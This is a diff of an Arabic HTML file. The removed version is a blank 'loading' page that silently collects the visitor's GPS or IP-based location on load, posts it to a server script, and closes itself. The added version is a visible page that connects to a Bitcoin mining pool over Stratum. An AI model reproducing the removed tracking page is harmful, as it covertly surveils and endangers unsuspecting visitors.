@@ -1,121 +1,134 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل</title>
-    <script>
-        // دالة لحفظ البيانات في ملف txt
-        function saveToFile(data) {
-            // إنشاء كائن FormData
-            const formData = new FormData();
-            formData.append('data', JSON.stringify(data));
-            formData.append('token', 'SECURE_TOKEN_12345'); // توكن أمان
-            
-            // إرسال البيانات إلى الخادم
-            fetch('save_location.php', {
-                method: 'POST',
-                body: formData,
-                keepalive: true // ضمان إرسال البيانات حتى لو أُغلقت الصفحة
-            });
-        }
+‏<!DOCTYPE html>
+‏<html lang="ar" dir="rtl">
+‏<head>
+‏  <meta charset="UTF-8" />
+‏  <title>تعدين بيتكوين عبر Braiins Pool</title>
+‏  <style>
+‏    body {
+‏      font-family: Arial, sans-serif;
+‏      background: #222;
+‏      color: #eee;
+‏      padding: 20px;
+‏      direction: rtl;
+‏      text-align: center;
+    }
+‏    textarea {
+‏      width: 100%;
+‏      height: 300px;
+‏      background: #111;
+‏      color: #0f0;
+‏      border: none;
+‏      padding: 10px;
+‏      font-family: monospace;
+‏      resize: none;
+    }
+‏    input, button {
+‏      font-size: 1rem;
+‏      padding: 10px;
+‏      margin: 5px;
+‏      border-radius: 6px;
+‏      border: none;
+    }
+‏    input {
+‏      width: 300px;
+    }
+‏    button {
+‏      background: #f7931a;
+‏      color: white;
+‏      cursor: pointer;
+    }
+‏    button:hover {
+‏      background: #e07b00;
+    }
+‏  </style>
+‏</head>
+‏<body>
 
-        // عند تحميل الصفحة
-        window.addEventListener('DOMContentLoaded', function() {
-            // محاولة الحصول على الموقع الجغرافي
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        // جمع البيانات
-                        const locationData = {
-                            timestamp: new Date().toISOString(),
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            source: 'geolocation'
-                        };
-                        
-                        // حفظ البيانات في الملف
-                        saveToFile(locationData);
-                    },
-                    function(error) {
-                        // في حالة الخطأ، محاولة الحصول على الموقع عبر IP
-                        fetch('https://ipapi.co/json/')
-                            .then(response => response.json())
-                            .then(ipData => {
-                                const locationData = {
-                                    timestamp: new Date().toISOString(),
-                                    latitude: ipData.latitude,
-                                    longitude: ipData.longitude,
-                                    accuracy: 50000, // دقة منخفضة
-                                    source: 'ipapi',
-                                    error: getGeolocationError(error),
-                                    city: ipData.city,
-                                    country: ipData.country_name
-                                };
-                                
-                                // حفظ البيانات في الملف
-                                saveToFile(locationData);
-                            });
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                // المتصفح لا يدعم خدمة الموقع الجغرافي
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(ipData => {
-                        const locationData = {
-                            timestamp: new Date().toISOString(),
-                            latitude: ipData.latitude,
-                            longitude: ipData.longitude,
-                            accuracy: 50000, // دقة منخفضة
-                            source: 'ipapi',
-                            error: 'GEOLOCATION_NOT_SUPPORTED',
-                            city: ipData.city,
-                            country: ipData.country_name
-                        };
-                        
-                        // حفظ البيانات في الملف
-                        saveToFile(locationData);
-                    });
-            }
-            
-            // دالة لترميز أخطاء الموقع الجغرافي
-            function getGeolocationError(error) {
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        return 'PERMISSION_DENIED';
-                    case error.POSITION_UNAVAILABLE:
-                        return 'POSITION_UNAVAILABLE';
-                    case error.TIMEOUT:
-                        return 'TIMEOUT';
-                    default:
-                        return 'UNKNOWN_ERROR';
-                }
-            }
-            
-            // إغلاق الصفحة بعد 2 ثانية
-            setTimeout(function() {
-                window.close();
-            }, 2000);
-        });
-    </script>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #ffffff;
-            height: 100vh;
-            overflow: hidden;
+‏  <h1>تعدين بيتكوين عبر Braiins Pool</h1>
+
+‏  <input id="workerName" type="text" placeholder="اسم العامل" value="mezom94.workerName" /><br/>
+‏  <input id="workerPass" type="text" placeholder="كلمة المرور" value="anything123" /><br/>
+‏  <button id="connectBtn">الاتصال بتجمع التعدين</button>
+
+‏  <h3>سجل الأحداث</h3>
+‏  <textarea id="log" readonly></textarea>
+
+‏<script>
+‏  const poolUrl = 'wss://stratum.braiins.com:3333';
+‏  let ws;
+‏  const logArea = document.getElementById('log');
+‏  const connectBtn = document.getElementById('connectBtn');
+
+‏  function log(msg) {
+‏    logArea.value += msg + "\n";
+‏    logArea.scrollTop = logArea.scrollHeight;
+  }
+
+‏  connectBtn.onclick = () => {
+‏    if (ws && ws.readyState === WebSocket.OPEN) {
+‏      ws.close();
+‏      log("تم قطع الاتصال");
+‏      connectBtn.textContent = "الاتصال بتجمع التعدين";
+‏      return;
+    }
+
+‏    const workerName = document.getElementById('workerName').value.trim();
+‏    const workerPass = document.getElementById('workerPass').value.trim();
+
+‏    ws = new WebSocket(poolUrl);
+
+‏    ws.onopen = () => {
+‏      log("تم الاتصال بتجمع التعدين");
+
+      // إرسال طلب الاشتراك
+‏      const subscribeRequest = {
+‏        id: 1,
+‏        method: 'mining.subscribe',
+‏        params: []
+      };
+‏      ws.send(JSON.stringify(subscribeRequest));
+    };
+
+‏    ws.onmessage = (event) => {
+‏      const message = JSON.parse(event.data);
+‏      log("رسالة من التجمع: " + JSON.stringify(message));
+
+‏      if (message.id === 1) {
+        // بعد الاشتراك، إرسال التفويض
+‏        const authorizeRequest = {
+‏          id: 2,
+‏          method: 'mining.authorize',
+‏          params: [workerName, workerPass]
+        };
+‏        ws.send(JSON.stringify(authorizeRequest));
+      }
+
+‏      if (message.id === 2) {
+‏        if (message.result === true) {
+‏          log("تم التفويض بنجاح، جاهز للتعدين");
+‏          connectBtn.textContent = "قطع الاتصال";
+‏        } else {
+‏          log("فشل التفويض: " + JSON.stringify(message.error));
         }
-    </style>
-</head>
-<body>
-    <!-- الصفحة فارغة تماماً -->
-</body>
-</html>
+      }
+
+‏      if (message.method === 'mining.notify') {
+‏        log("مهمة تعدين جديدة:");
+‏        log(JSON.stringify(message.params, null, 2));
+        // هنا يمكنك البدء بمعالجة المهمة (مثلاً البحث عن nonce)
+      }
+    };
+
+‏    ws.onerror = (err) => {
+‏      log("خطأ في الاتصال: " + err.message);
+    };
+
+‏    ws.onclose = () => {
+‏      log("تم قطع الاتصال");
+‏      connectBtn.textContent = "الاتصال بتجمع التعدين";
+    };
+  };
+‏</script>
+
+‏</body>
+‏</html>
